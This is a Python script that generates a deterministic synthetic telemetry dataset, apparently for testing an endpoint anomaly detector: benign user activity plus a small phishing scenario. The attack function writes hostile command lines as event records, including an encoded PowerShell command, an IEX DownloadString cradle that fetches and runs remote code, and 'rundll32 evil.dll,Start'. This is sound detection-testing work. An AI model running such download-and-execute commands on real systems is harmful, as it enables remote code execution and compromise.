"""Generate a SYNTHETIC, deterministic demo dataset.

Four files are written under data/samples/:
  normal/baseline_normal.json     8 weeks of benign activity, 6 users on 6 hosts,
                                  profiles differ (office worker, developer, admin...)
  normal/heldout_known.json       the following 2 weeks for the SAME entities
                                  (time-disjoint: used to measure false positives)
  normal/heldout_unseen.json      benign activity from entities with NO history
                                  (entity-disjoint: the new-hire / new-laptop case)
  attack/phishing_scenario.json   a small multi-stage chain for the UI demo

The benign sets deliberately include activity that looks risky to naive rules
(msbuild from Visual Studio, certutil -hashfile, schtasks listing, powershell -File).

Synthetic data is for smoke tests and false-positive measurement only; it says
nothing about detection of real attacks. See docs/EVALUATION.md.
"""
from __future__ import annotations

import argparse
import json
import os
import random
from datetime import datetime, timedelta, timezone

OUT = os.path.join(os.path.dirname(__file__), "..", "data", "samples")
START = datetime(2026, 3, 2, tzinfo=timezone.utc)      # fixed: output is reproducible

# name -> (host, apps, extra benign command lines that resemble attacker tradecraft)
PROFILES = {
    "alice": ("WS-01", ["winword.exe", "excel.exe", "outlook.exe", "chrome.exe", "teams.exe"], []),
    "bob":   ("WS-02", ["devenv.exe", "chrome.exe", "git.exe", "code.exe"],
              [("msbuild.exe", "devenv.exe", "msbuild.exe app.sln /t:Build")]),
    "carol": ("WS-03", ["excel.exe", "chrome.exe", "outlook.exe", "acrord32.exe"], []),
    "dave":  ("WS-04", ["powershell.exe", "cmd.exe", "chrome.exe", "mmc.exe"],
              [("powershell.exe", "explorer.exe", "powershell.exe -File C:\\ops\\backup.ps1"),
               ("schtasks.exe", "cmd.exe", "schtasks.exe /query /fo list"),
               ("certutil.exe", "cmd.exe", "certutil.exe -hashfile setup.exe SHA256")]),
    "erin":  ("WS-05", ["chrome.exe", "slack.exe", "figma.exe"], []),
    "frank": ("WS-06", ["winword.exe", "chrome.exe", "outlook.exe"], []),
}
UNSEEN = {"grace": ("WS-21", ["chrome.exe", "outlook.exe", "winword.exe"], []),
          "heidi": ("WS-22", ["devenv.exe", "chrome.exe"],
                    [("msbuild.exe", "devenv.exe", "msbuild.exe lib.csproj")]),
          "ivan":  ("WS-23", ["powershell.exe", "chrome.exe"],
                    [("certutil.exe", "cmd.exe", "certutil.exe -hashfile a.iso SHA256")])}
SYSTEM_BINS = {"cmd.exe", "powershell.exe", "certutil.exe", "schtasks.exe", "mmc.exe"}
INTERNAL_IPS = ["10.0.0.5", "10.0.0.8", "10.0.1.20", "10.0.2.15"]


def _rec(ts, host, user, etype, **kw):
    rec = {"timestamp": ts.isoformat(), "host": host, "user": f"ACME\\{user}",
           "event": {"category": [etype]}}
    rec.update(kw)
    return rec


def _proc(ts, host, user, name, parent, cmd):
    return _rec(ts, host, user, "process", process={
        "name": name, "parent": {"name": parent}, "command_line": cmd,
        "executable": (f"C:\\Windows\\System32\\{name}" if name in SYSTEM_BINS
                       else f"C:\\Program Files\\{name}")})


def telemetry(profiles: dict, start: datetime, days: int, rng: random.Random) -> list[dict]:
    out = []
    for user, (host, apps, extras) in profiles.items():
        for d in range(days):
            day = start + timedelta(days=d)
            if day.weekday() >= 5:
                continue
            login = day.replace(hour=rng.randint(8, 10), minute=rng.randint(0, 59))
            out.append(_rec(login, host, user, "authentication", LogonType="3", IpAddress="10.0.0.9"))
            for _ in range(rng.randint(15, 30)):
                t = day.replace(hour=rng.randint(9, 18), minute=rng.randint(0, 59))
                app = rng.choice(apps)
                out.append(_proc(t, host, user, app, "explorer.exe", app))
                if app == "chrome.exe":
                    out.append(_rec(t, host, user, "network", destination={
                        "ip": rng.choice(INTERNAL_IPS), "port": 443}, process={"name": "chrome.exe"}))
            for name, parent, cmd in extras:
                if rng.random() < 0.6:
                    t = day.replace(hour=rng.randint(9, 17), minute=rng.randint(0, 59))
                    out.append(_proc(t, host, user, name, parent, cmd))
    return out


def attack_scenario() -> list[dict]:
    """Phishing -> post-compromise chain at 02:14 against a user who has history."""
    host, user = "WS-01", "alice"
    t = datetime(2026, 5, 11, 2, 14, 1, tzinfo=timezone.utc)
    return [
        _rec(t, host, user, "authentication", LogonType="10", IpAddress="185.220.101.5"),
        _proc(t + timedelta(seconds=20), host, user, "powershell.exe", "winword.exe", "powershell -enc ZQB2AGkAbAA="),
        _proc(t + timedelta(seconds=25), host, user, "powershell.exe", "winword.exe",
              "powershell IEX(New-Object Net.WebClient).DownloadString('http://x')"),
        _rec(t + timedelta(seconds=40), host, user, "network",
             destination={"ip": "185.220.101.5", "port": 443}, process={"name": "powershell.exe"}),
        _proc(t + timedelta(seconds=90), host, user, "rundll32.exe", "powershell.exe",
              "rundll32 evil.dll,Start"),
    ]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--out", default=OUT)
    a = ap.parse_args()
    rng = random.Random(a.seed)
    for sub in ("normal", "attack"):
        os.makedirs(os.path.join(a.out, sub), exist_ok=True)
    files = {
        "normal/baseline_normal.json": telemetry(PROFILES, START, 56, rng),
        "normal/heldout_known.json": telemetry(PROFILES, START + timedelta(days=56), 14, rng),
        "normal/heldout_unseen.json": telemetry(UNSEEN, START + timedelta(days=56), 14, rng),
        "attack/phishing_scenario.json": attack_scenario(),
    }
    for rel, data in files.items():
        with open(os.path.join(a.out, rel), "w") as fh:
            json.dump(data, fh, indent=1)
        print(f"  {rel}: {len(data)} events")
    print("Wrote SYNTHETIC demo data to", os.path.abspath(a.out))


if __name__ == "__main__":
    main()
